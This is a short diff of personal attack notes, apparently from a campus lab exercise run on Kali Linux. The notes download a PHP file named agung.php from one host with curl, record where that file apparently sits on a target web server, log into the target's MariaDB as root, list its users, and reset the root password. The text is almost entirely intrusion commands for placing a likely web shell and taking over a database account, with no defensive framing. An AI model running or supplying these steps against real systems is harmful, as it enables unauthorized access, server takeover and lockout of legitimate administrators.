@@ -5,6 +5,8 @@ di kali linux
 cmd
 curl -O http://172.16.133.201:8080/agung.php
 
+http://172.16.133.235/biodata/agung.php
+
 ┌──(kali㉿kali)-[~]
 └─$ mysql -h 172.16.133.235 -u root -p
 Enter password: 
@@ -28,5 +30,11 @@ Query OK, 1 row affected (0.004 sec)
 Rows matched: 1  Changed: 1  Warnings: 0
 
 MariaDB [kampus]> 
+
+SELECT User, Host FROM mysql.user;
+
+ALTER USER 'root'@'localhost' IDENTIFIED BY 'agung';
+FLUSH PRIVILEGES;
+EXIT;
 
 
